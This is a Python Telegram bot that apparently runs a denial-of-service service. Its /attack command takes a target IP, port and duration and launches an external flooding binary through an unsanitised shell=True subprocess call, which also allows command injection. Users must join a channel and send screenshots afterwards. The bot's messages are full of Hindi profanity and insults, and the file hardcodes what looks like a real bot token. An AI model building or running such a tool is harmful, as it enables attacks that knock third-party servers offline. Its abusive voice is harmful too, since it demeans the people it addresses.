#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading
from telebot import types

# Insert your Telegram bot token here
bot = telebot.TeleBot('8048715452:AAEdWGG7J-d1zVvmFSN1UiddyABpm34aLj0')

# Group and channel details
GROUP_ID = "-1002369239894"
CHANNEL_USERNAME = "@KHAPITAR_BALAK77"

# Global variables
is_attack_running = False
attack_end_time = None
pending_feedback = {}
update_thread = None
current_attack_message = None

# Function to check if user is in channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# Function to update attack status in the same message
def update_attack_status(chat_id, message_id, target, port):
    global is_attack_running, attack_end_time

    while is_attack_running:
        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
        if remaining_time <= 0:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"✅ **Attack khatam! Ab screenshot bhej warna teri maa ki...** 📸"
            )
            is_attack_running = False
            return

        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"""🔥 **Attack chalu hai behenchod!** 🔥  
🎯 **Target:** `{target}`  
🔢 **Port:** `{port}`  
⏳ **Baaki Time:** `{int(remaining_time)}s`  
🚀 **Khatam hone ka intezar mat kar, screenshot ready rakh!**"""
            )
        except:
            pass  

        time.sleep(1)

# Handle attack command
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global is_attack_running, attack_end_time, update_thread, current_attack_message
    user_id = str(message.from_user.id)
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 **BSDK ye bot sirf group me chalta hai! Bhaag yaha se!** ❌")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **Pehle channel join kar, warna tujhe kuch nahi milega chaman!** {CHANNEL_USERNAME}")
        return

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "😡 **Bhai pehle screenshot bhej warna naya attack maarne ka sapna bhool ja!**")
        return

    if is_attack_running:
        bot.reply_to(message, "⚠️ **Abe ruk na! Pehle wala attack khatam toh hone de! Jaldi me hai kya?**")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ **Usage: /attack `<IP>` `<PORT>` `<TIME>`**\n😎 **Sahi likh behenchod!**")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **Port aur Time number hone chahiye! Kitna ganja phoonk raha hai bhai?**")
        return

    if time_duration > 180:
        bot.reply_to(message, "🚫 **180 sec se zyada nahi milega! Tera baap bhi aake bole toh bhi nahi!**")
        return

    # Confirm attack
    confirm_msg = f"""⚡ **Attack Confirmed!**  
🎯 **Target:** `{target}`  
🔢 **Port:** `{port}`  
⏳ **Duration:** `{time_duration}s`  
🚀 **Ja beta, attack chalu ho gaya!**  
📸 **Attack ke baad screenshot bhejna warna gaand maar lenge!**"""

    msg = bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown")
    current_attack_message = msg

    is_attack_running = True
    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=time_duration)
    pending_feedback[user_id] = True  

    update_thread = threading.Thread(target=update_attack_status, args=(message.chat.id, msg.message_id, target, port))
    update_thread.start()

    try:
        subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True)
    except subprocess.CalledProcessError:
        bot.reply_to(message, "❌ **Bhai attack fail ho gaya! Teri naseeb hi kharab hai!**")
        is_attack_running = False
        attack_end_time = None
        return

    is_attack_running = False
    attack_end_time = None

# Handle /check command
@bot.message_handler(commands=['check'])
def handle_check(message):
    if is_attack_running and attack_end_time:
        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
        bot.reply_to(message, f"⏳ **Gaand mara mat, attack chal raha hai! Baaki time: {int(remaining_time)}s**")
    else:
        bot.reply_to(message, "✅ **Attack khatam! Ab naya laga behenchod!**")

# Handle screenshot submission and forward to main channel
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    
    if pending_feedback.get(user_id, False):
        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)  
        bot.send_message(CHANNEL_USERNAME, f"📸 **User `{user_id}` ka screenshot aa gaya! Behnchod OP!**")

        bot.reply_to(message, "✅ **Chal ab naya attack maar sakta hai, warna bhaag!** 🚀")
        del pending_feedback[user_id]  
    else:
        bot.reply_to(message, "❌ **Chutiye, screenshot ki zaroorat nahi ab! Kya kar raha hai?**")

# Bot start command
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""🌟🔥 Oye {user_name}! 🔥🌟  

🚀 **BSDK Ready ho ja!**  
💥 Attack karne ka full chance hai!  

🔗 **Group Join Kar Warna BSDK Ban Jayega!**  
👉 [Telegram Group](https://t.me/R_SDanger_op) 🚀🔥""" 
    
    bot.reply_to(message, response, parse_mode="Markdown")

# Start polling
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        time.sleep(15)